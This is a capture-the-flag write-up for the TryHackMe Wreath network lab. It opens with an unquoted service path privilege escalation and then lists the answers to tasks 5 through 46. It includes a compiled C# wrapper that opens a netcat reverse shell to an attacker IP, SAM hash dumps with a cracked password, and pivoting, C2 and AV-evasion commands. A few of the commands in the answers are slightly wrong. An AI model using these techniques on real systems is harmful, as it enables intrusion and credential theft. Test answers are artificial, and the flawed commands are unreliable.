wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
```

![[windows_services.png]]

This command filters the services on the system, only displaying those not in the `C:\Windows` directory - most of the time this will show user-installed services.  From the above, it appears that `SystemExplorerHelpService` is potentially vulnerable.  This is due to the lack of quotation marks - **unquoted service path**.  If any of the directories in that path contains a space and are writeable, we may be able to escalate privileges - assuming the service is running as `NT AUTHORITY\SYSTEM`.

![[sc_qc_systemexplorerhelpservice.png]]

We can then check the permissions on the directory to check if it is writeable:

![[check_directory_writeable.png]]

We now create an exploit for the unquoted system path using `mono`, the .NET core compiler for Linux:

```console
$ sudo apt install mono-devel
```

Now, we create a `Wrapper.cs` file which activates `nc-v3r4x.exe`:

```cs
using System;
using System.Diagnostics;

namespace Wrapper{
	class Program{
		static void Main() {
			Process proc = new Process();
			ProcessStartInfo procInfo = new ProcessStartInfo("c:\\windows\\temp\\nc-v3r4x.exe", "10.50.91.109 5555 -e cmd.exe");
			procInfo.CreateNoWindow = true;
			proc.StartInfo = procInfo;
			proc.Start();
		}
	}
}
```

Then, we compile the program using the mono `mcs` compiler:

```console
$ mcs Wrapper.cs
$ ls
Wrapper.cs Wrapper.exe
```

To transfer the file, we can use an Impacket SMB server, rather than Python's HTTP server:

```console
$ sudo git clone https://github.com/SecureAuthCorp/impacket /opt/impacket && cd /opt/impacket && sudo pip3 install .
```

We then start a temporary SMB server:

```console
$ sudo python3 /opt/impacket/examples/smbserver.py share . -smb2support -username user -password s3cureP@ssword
```

This creates a server on our attacker machine called `share` with `SMBv2` support, accepting connections based on the provided credentials `user:s3cureP@ssword`.

In our reverse shell, we can then authenticate as `user`:

![[smb_authenticate.png]]

We can now copy the `Wrapper.exe` file to the current user's `%TEMP%` directory:

![[upload_wrapper_exe.png]]

Then disconnect from the share:

```console
C:\>net use \\10.50.91.109\share /del
net use \\10.50.91.109\share /del
\\10.50.91.109\share was deleted sucessfully.
```

We can then execute the `wrapper-v3r4x.exe` file and get a reverse shell back on a netcat listener:

![[wrapper_exe_callback.png]]

This means that our program runs without being caught by Windows Defender meaning we can now exploit the unquoted service path vulnerability.  If a service path (e.g., `C:\Dir One\Dir Two\Exec.exe`) contains spaces and is not surrounded by quotes, Windows will look for the executable in:

1. `C:\Dir.exe`
2. `C:\Dir One\Dir.exe`
3. `C:\Dir One\Dir Two\Exec.exe`

In this case, we can copy our wrapper `.exe` to the following:

1. `C:\Program.exe`: may not have write permissions
2. `C:\Program Files (x86)\System.exe`: may not have write permissions
3. `C:\Program Files (x86)\System Explorer\System.exe`: more likely to have write permissions

As such, we will use option (3):

![[copy_wrapper.png]]

To get this to run, we have to `stop` and `start` the `SystemExplorerHelpService` with `sc`:

```console
C:\>sc stop SystemExplorerHelpService

C:\>sc start SystemExplorerHelpService
```

Finally, we get a callback on our previous netcat listener as `NT AUTHORITY\SYSTEM`:

![[nt_authority_system.png]]

To prove to Thomas that we have gained access to his personal PC, we can retrieve the Administrator hash from the SAM and SYSTEM registry hives and transfer it to our machine:

![[hash_transfer.png]]

![[system_hive_transfer.png]]

And use impacket to view the dumped hives:

![[dumped_hashes.png]]

```console
$ sudo python3 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL                     
Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation

[*] Target system bootKey: 0xfce6f31c003e4157e8cb1bc59f4720e6
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a05c3c807ceeb48c47252568da284cd2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:06e57bdd6824566d79f127fa0de844e2:::
Thomas:1000:aad3b435b51404eeaad3b435b51404ee:02d90eda8f6b6b06c32d5f207831101f:::
[*] Cleaning up...
```

-----

###### Task 5 - Webserver Enumeration

1. How many of the first 15000 ports are open on the target?

```
4
```

2. What OS does Nmap think is running?

```
CentOS
```

3. Open the IP in your browser - what site does the server try to redirect you to?

```
https://thomaswreath.thm
```

4. Looks like Thomas forgot to configure DNS! Add it to your `/etc/hosts` file manually.

```
No answer needed
```

5. Read through the text on the page. What is Thomas' mobile phone number?

```
+447821548812
```

6. Looking back at the service scan, what server version does nmap detect is running on the highest port?

```
MiniServ 1.890 (Webmin httpd)
```

7. It appears this service is vulnerable to an unauthenticated remote code execution exploit. What is the CVE number for this exploit?

```
CVE-2019-15107
```

8. We have everything we need to break into this machine, so let's get going!

```
No answer needed
```

###### Task 6 - Webserver Exploitation

1. Run the exploit and obtain a pseudoshell on the target!

```
No answer needed
```

2. Which user was the server running as?

```
root
```

3. Get a reverse shell from the target - you can do it manually or by using `shell` in the pseudoshell.

```
No answer needed
```

4. (**Optional**) Stabilise the reverse shell.

```
No answer needed
```

5. What is the `root` user's password hash?

```
$6$i9vT8tk3SoXXxK2P$HDIAwho9FOdd4QCecIJKwAwwh8Hwl.BdsbMOUAd3X/chSCvrmpfy.5lrLgnRVNq6/6g0PxK9VqSdy47/qKXad1
```

6. You might be able to find a file that will give you consistent access to the `root` user through one of the other services.  What is the full path to this file?

```
/root/.ssh/id_rsa
```

7. We have everything we need for now.  Let's move onto *pivoting*!

```
No answer needed
```

###### Task 7 - (Pivoting) What is Pivoting?

1. Read the pivoting introduction.

```
No answer needed
```

###### Task 8 - (Pivoting) High-level Overview

1. Which type of pivoting creates a channel through which information can be sent hidden inside another protocol?

```
Tunnelling
```

2. **Research**: Which Metasploit Framework Meterpreter command can be used to create a port forward?

```
portfwd
```

###### Task 9 - (Pivoting) Enumeration

1. What is the absolute path to the file containing DNS entries on Linux?

```
/etc/resolv.conf
```

2. What is the absolute path to the hosts file on Windows?

```
C:\Windows\System32\drivers\etc\host
```

3. How could you see which IP addresses are active and allow ICMP echo requests on the `172.16.0.x/24` network using Bash?

```
for i in {1..255}; do (ping -c 172.16.0.${1} | grep "bytes from" &); done
```

###### Task 10 - (Pivoting) Proxychains and Foxyproxy

1. What line would you put in your proxychains config file (`proxychains.conf`) to redirect through a socks4 proxy on `127.0.0.1:4242`?

```
socks4 127.0.0.1 4242
```

2. What command would you use to telnet through a proxy to 172.16.0.100:23?

```
proxychains telnet 172.16.0.100 23
```

3. You have discovered a webapp running on a target inside an isolated network. Which tool is more apt for proxying to a web app: Proxychains (PC) or FoxyProxy (FP)?

```
FP
```

###### Task 11 - (Pivoting) SSH Tunnelling / Port Forwarding

1. If you're connecting to an SSH server *from* your attacking machine to create a port forward, would this be a local (L) port forward or a remote (R) port forward?

```
L
```

2. Which switch combination can be used to background an SSH port forward or tunnel?

```
-fN
```

3. It is a good idea to enter our own password on the remote machine to set up a reverse proxy, Aye or Nay?

```
Nay
```

4. What command would you use to create a pair of throwaway SSH keys for a reverse connection?

```
ssh-keygen
```

5. If you want to set up a reverse port forward from port `22` of a remote machine (`172.16.0.100`) to port `2222` of your local machine (`172.16.0.200`), using a keyfile called `id_rsa` and backgrounding the shell, what command would you use? (assume username=`kali`)

```
ssh -R 2222:172.16.0.100:22 kali@172.16.0.200 -i id_rsa -fN
```

6. What command would you use to set up a forward proxy on port `8000` to `user@target.thm`, backgrounding the shell?

```
ssh -D 8000 user@target.thm -fN
```

7. If you had SSH access to a server (`172.16.0.50`) with a webserver running internally on port `80` (only accessible via `127.0.0.1:80`), how would you forward it to port `8000` on your attacker machine?  Assume the username=`user` and backgrounding the shell.

```
ssh -L 8000:127.0.0.1:80 user@172.16.0.50 -fN
```

###### Task 12 - (Pivoting) plink.exe

1. What tool can be used to convert OpenSSH keys into PuTTY-style keys?

```
puttygen
```

###### Task 13 - (Pivoting) Socat

1. Which socat option allows you to reuse the same listening port for more than one connection?

```
reuseaddr
```

2. If your attacking IP is `172.16.0.200`, how would you relay a reverse shell to TCP port `443` on your attacker machine using a static copy of socat in the current directory?  Use TCP port `8000` for the server listener, but do not background the process.

```
./socat tcp-l:8000 tco:172.16.0.200:443
```

3. What command would you use to forward TCP port `2222` on a compromised server to `172.16.0.100:22`, using a static copy of socat in the current directory, and backgrounding the process?

```
./socat tcp-l:2222,fork,reuseaddr tcp:172.16.0.100:22 &
```

4. **(Optional)** Try to create an encrypted port forward or relay using the `OPENSSL` options in socat.  Task 7 of the [shells](https://tryhackme.com/room/introtoshells) room may help.

###### Task 14 - (Pivoting) Chisel

1. What command would you use to start a chisel server for a reverse connection on your attacker machine?  Use port `4242` for the listener and **do not** background the process.

```
./chisel server -p 4242 --reverse
```

2. What command would you use to connect back to this server with a SOCKS proxy from a compromised host, assuming your own IP is `172.16.0.200` and backgrounding the process?

```
./chisel client 172.16.0.200:4242 R:socks &
```

3. How would you forward `172.16.0.100:3306` to your own port `33060` using a chisel remote port forward, assuming your own IP is `172.16.0.200` and the listening port is `1337`?  Ensure to background this process

```
./chisel client 172.16.0.200:1337 R:33060:172.16.0.100:3306 &
```

4. If you have a chisel server running on port `4444` of `172.16.0.5`, how could you create a local port forward, opening port `8000` locally and linking to `172.16.0.10:80`?

```
./chisel client 172.16.0.5:4444 8000:172.16.0.10:80
```

###### Task 15 - (Pivoting) sshuttle

1. How would you use sshuttle to connect to `172.16.20.7`, with a username  of "pwned" and a subnet of `172.16.0.0/16`?

```
sshuttle -r pwned@172.16.20.7 172.16.0.0/16
```

2. What switch (and argument) would you use to tell sshuttle to use a keyfile called `priv_key` located in the current directory?

```
--ssh-cmd "ssh -i priv_key"
```

3. You are trying to use sshuttle to connect to `172.16.0.100`.  You want to forward the `172.16.0.x/24` range of IP addresses, but you are getting a **broken pipe** error.  What switch (and argument) could you use to fix this error?

```
-x 172.16.0.100
```

###### Task 16 - (Pivoting) Conclusion

1. Read the conclusion and experiment with the pivoting techniques demonstrated.

```
No answer needed
```

###### Task 17 - (Git Server) Enumeration

1. Excluding the out-of-scope hosts, and the current host (`.200`), how many hosts were discovered active on the network?

```
2
```

2. In ascendin order, what are the last octets of these host IPv4 addresses?

```
100,150
```

3. Scan the hosts.  Which one does **not** return a status of "filtered" for every port (submit the last octet only)?

```
150
```

4. Assuming the other host is inaccessible, which TCP ports (in ascending order, comma separated) below port 15000, are open on the remaining target?

```
80,3389,5985
```

5. Assuming that the service guesses made by nmap are accurate, which of the found services is more likely to contain an exploitable vulnerability?

```
http
```

6. Now that we have an idea about the other hosts on the network, we can start looking at some of the tools and techniques we could use to accesss them!

```
No answer needed
```

###### Task 18 - (Git Server) Pivoting

1. What is the name of the program running the service?

```
gitserver
```

2. Do these default credentials work (Aye/Nay?)

```
Nay
```

3. Use the command: `searchsploit SERVICENAME` on Kali to search for exploits related to this service.

```
No answer needed
```

4. You will see three publicly available exploits. There is one Python RCE exploit for version 2.3.10 of this service. What is the EDB ID number of this exploit?

```
43777
```

###### Task 19 - (Git Server) Code Review

1. Look at the information at the top of the script. On what date was this exploit written?

```
18.01.2018
```

2. Is the script written in Python2 or Python3?

```
Python2
```

3. Add an appropriate shebang to the exploit, at the very top of the file!

```
No answer needed
```

4. What is the name of the cookie set in the POST request made on line 73 of the exploit?

```
csrftoken
```

###### Task 20 - (Git Server) Exploitation

1. **(Optional)** Using the given code for the exploit we used against the web server, see if you can adapt this to create a full pseudoshell environment.

```
No answer needed
```

2. What is the hostname for this target?

```
GIT-SERV
```

3. What operating system is this target?

```
Windows
```

4. What user is the server running as?

```
NT AUTHORITY\SYSTEM
```

5. With the `ping -n 3 ATTACKING_IP` command, how many ICMP response packets will make it to the waiting listener?

```
0
```

6. Set up a listener or relay on `.200` using either netcat or socat

```
No answer needed
```

7. Pick a method and get a shell!

```
No answer needed
```

###### Task 21 - (Git Server) Stabilisation and Post Exploitation

1. Create an account on the target. Assign it to the `Administrators` and `Remote Management Users` groups.

```
No answer needed
```

2. Authenticate with WinRM -- make sure you can get a stable session on the target

```
No answer needed
```

3. Authenticate with RDP and share a local copy of Mimikatz, then dump the password hashes for the system. What is the Administrator password hash?

```
37db630168e5f82aafa8461e05c6bbd1
```

4. What is the NTLM password hash for the user "Thomas"?

```
02d90eda8f6b6b06c32d5f207831101f
```

5. Using Crackstation, what is Thomas' password?

```
i<3ruby
```

6. Use pass-the-hash with `evil-winrm`:

```
No answer needed
```

###### Task 22 - (Command and Control) Introduction

1. Read the introduction

```
No answer needed
```

###### Task 23 - (Command and Control) Empire: Installation

1. Install and execute Empire/Starkiller

```
No answer needed
```

###### Task 24 - (Command and Control) Empire: Overview

1. Read the overview

```
No answer needed
```

2. Can we get an agent back from the git server directly (Aye/Nay)?

```
Nay
```

###### Task 25 - (Command and Control) Empire: Listeners

1. Start a listener in Empire and/or Starkiller

```
No answer needed
```

###### Task 26 - (Command and Control) Empire: Stagers

1. Using your choice of Empire CLI or Starkiller, generate a `multi/bash` stager and save it as a file on your own disk

```
No answer needed
```

2. **(Optional)** Read through the code in the script and see if you can decipher what it is doing. You will need to decode the payload from Base64 before doing so

```
No answer needed
```

###### Task 27 - (Command and Control) Empire: Agents

1. Using the `help` command for guidance: in Empire CLI, how would we run the `whoami` command inside the agent?

```
shell whoami
```

2. Kill your agents on the webserver then let's look at proxying Empire agents!

```
No answer needed
```

###### Task 28 - (Command and Control) Empire: Hop Listeners

1. Create a `http_hop` listener in Empire CLI and/or Starkiller

```
No answer needed
```

###### Task 29 - (Command and Control) Git Server

1. Get an agent back from the Git Server!

```
No answer needed
```

###### Task 30 - (Command and Control) Empire: Modules

1. Read the above information and try to experiment with the Empire modules available

```
No answer needed
```

###### Task 31 - (Command and Control) Empire: Interactive Shell

1. Find and use the interactive shell in both the Empire CLI client and in Starkiller

```
No answer needed
```

###### Task 32 - (Command and Control) Conclusion

1. Read the C2 conclusion

```
No answer needed
```

2. **[Bonus Exercise]** Try working through this section again, using a different C2 framework of your choice - use the C2 matrix to help you.

```
No answer needed
```

###### Task 33 - (Personal PC) Enumeration

1. Scan the top 50 ports of the last IP address you found in Task 17. Which ports are open (lowest to highest, separated by commas)?

```
80,3389
```

###### Task 34 - (Personal PC) Pivoting

1. Whether you choose the recommended option or not, get a pivot up and running!

```
No answer needed
```

2. Using the Wappalyzer browser extension ([Firefox](https://addons.mozilla.org/en-GB/firefox/addon/wappalyzer/) | [Chrome](https://chrome.google.com/webstore/detail/wappalyzer/gppongmhjkpfnbhagpmjfkannfbllamg?hl=en)) or an alternative method, identify the server-side Programming language (including the version number) used on the website. 

###### Task 35 - (Personal PC) The Wonders of Git

1. Using your WinRM access to look around the Git Server. What is the absolute path to the `Website.git` directory?

```
C:\GitStack\repositories\Website.git
```

2. Use `evil-winrm` to download the entire directory (using `download PATH\TO\Website.git`)

```
No answer needed
```

3. Exit out of `evil-winrm` and rename the odd subdirectory to `.git`

```
No answer needed
```

4. Recreate the repository -- we will perform code analysis in the next task!

```
No answer needed
```

5. The most up-to-date version of the site in the Git repository is in the `NUMBER-345ac8b236064b431fa43f53d91c98c4834ef8f3` directory

```
No answer needed
```

###### Task 36 - (Personal PC) - Website Code Analysis

1. Read through the file. What does Thomas have to phone Mrs Walker about?

```
Neighbourhood Watch Meetings
```

2. Aside from the filter, what protection method is likely to be in place to prevent people from accessing this page?

```
basic auth
```

3. Which extensions are accepted (comma separated, no spaces or quotes)?

```
jpeg,jpg,png,gif
```

4. We have ourselves a vulnerability!

```
No answer needed
```

###### Task 37 - (Personal PC) Exploit PoC

1. See if you can login using these usernames and that password!

```
No answer needed
```

2. Try uploading a legitimate image -- see if you can access it!

```
No answer needed
```

3. We have the ability to execute arbitrary PHP code on the system!

```
No answer needed
```

###### Task 38 - (AV Evasion) Introduction

1. Which category of evasion covers uploading a file to the storage on the target before executing it?

```
on-disk evasion
```

2. What does AMSI stand for?

```
Anti-Malware Scan Interface
```

3. Which category of evasion does AMSI affect?

```
in-memory evasion
```

###### Task 39 - (AV Evasion) AV Detection Methods

1. What other name can be used for Dynamic/Heuristic detection methods?

```
Behavioural
```

2. If AV software splits a program into small chunks and hashes them, checking the results against a database, is this a static or dynamic analysis method?

```
Static
```

3. When dynamically analysing a suspicious file using a line-by-line analysis of the program, what would antivirus software check against to see if the behaviour is malicious?

```
pre-defined rules
```

4. What could be added toa file to ensure hat only a user can open it (preventing AV from executing the payload)?

```
password
```

###### Task 40 - (AV Evasion) PHP Payload Obfuscation

1. Construct the obfuscated PHP payload

```
No answer needed
```

2. Finalise the exploit

```
No answer needed
```

3. Upload your shell and attempt to access it

```
No answer needed
```

4. What is the hostname of the target?

```
WREATH-PC
```

5. What is our current username (including the domain in this)?

```
wreath-pc\thomas
```

###### Task 41 - (AV Evasion) Compiling Netcat and Reverse Shell!

1. **(Optional)** Follow the steps to compile a copy of `netcat.exe`

```
No answer needed
```

2. Start a Python webserver on your attacking machine using `sudo python3 -m http.server 80`

```
No answer needed
```

3. What output do you get when running the command `certutil.exe`?

```
CertUtil: -dump command completed successfully.
```

4. Escape the backslashes

```
No answer needed
```

5. Set up a netcat listener on your attacker machine and then execute `powershell.exe c:\\windows\\temp\\nc-USERNAME.exe ATTACKER_IP ATTACKER_PORT -e cmd.exe` within the webshell

```
No answer needed
```

6. **(Optional)** Try generating a metasploit reverse shell, transfer it to the target and let it get detected by Windows Defender

```
No answer needed
```

###### Task 42 - (AV Evasion) Enumeration

1. Use the `whoami /priv` command.  One of the privileges on this list is very famous for being used in the PrintSpoofer and Potato series of privilege escalation exploits -- which privilege is this?

```
SeImpersonatePrivilege
```

2. Now use the `whoami /groups` command to check the current user's groups.

```
No answer needed
```

3. Looking at non-default services, what is the name of the vulnerable user-installed service?

```
SystemExplorerHelpService
```

4. Is the service running as the local system account (Aye/Nay)?

```
Aye
```

5. Check the permissions on the directory

```
No answer needed
```

6. **(Optional)** Try to get a copy of WinPEAS up to the target (either the obfuscated executable or the batch variant) and run it. You will see that there are many more potential vulnerabilities on this target - mainly due to patches that haven't been installed.

```
No answer needed
```

###### Task 43 - (AV Evasion) Privilege Escalation

1. Write and compile a wrapper program using Mono or Visual Studio

```
No answer needed
```

2. For the time being, disconnect from the SMB server

```
No answer needed
```

3. Start a listener on your chosen port and try to execute the wrapper manually - you should get a reverse shell back

```
No answer needed
```

4. Copy your wrapper from `C:\Windows\Temp\wrapper-USERNAME.exe` to `C:\Program Files (x86)\System Explorer\System.exe`

```
No answer needed
```

5. We have root!

```
No answer needed
```

6. Clean up by deleting the wrapper and starting the service

```
No answer needed
```

7. **(Optional)**: Research how to write a real Windows Service executable in C# and try to create a wrapper or even a reverse shell that doesn't cause the `sc start` command to error out - this code [here](https://github.com/mattymcfatty/unquotedPoC) might help

```
No answer needed
```

###### Task 44 - (Exfiltration) Exfiltration Techniques and Post Exploitation

1. Is FTP a good protocol to use when exfiltrating data in a modern network (Aye/Nay)?

```
Nay
```

2. For what reason is HTTPS preferred over HTTP during exfiltration?

```
Encryption
```

3. Dump the hashes and delete the `.bak` files from the target if you copied them.  Finally, disconnect from the SMB server

```
No answer needed
```

4. What is the Administrator NT hash for this target?

```
a05c3c807ceeb48c47252568da284cd2
```

5. Remove all the tools, shells, payloads, accounts, and other remnants you left behind

```
No answer needed
```

###### Task 45 - (Conclusion) Debrief & Report

1. Write a report (or just read the information in the task)

```
No answer needed
```

2. Consider the following brief to be the "report-handling procedures" for this assignment

```
No answer needed
```

###### Task 46 - (Conclusion) Final Thoughts

1. Network complete!

```
No answer needed
```
